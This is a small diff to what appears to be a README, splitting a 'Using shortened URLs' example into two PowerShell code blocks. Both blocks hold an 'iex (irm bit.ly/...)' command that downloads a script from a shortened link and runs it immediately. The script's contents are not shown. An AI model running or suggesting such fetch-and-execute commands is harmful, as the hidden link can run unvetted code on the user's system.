@@ -10,6 +10,9 @@
 - Using shortened URLs:
     ```powershell
     powershell -Command "iex (irm https://bit.ly/4c3XH76)"
+    ```
+    
+    ```powershell
     powershell -Command "iex (irm bit.ly/4c3XH76)"
     ```
 
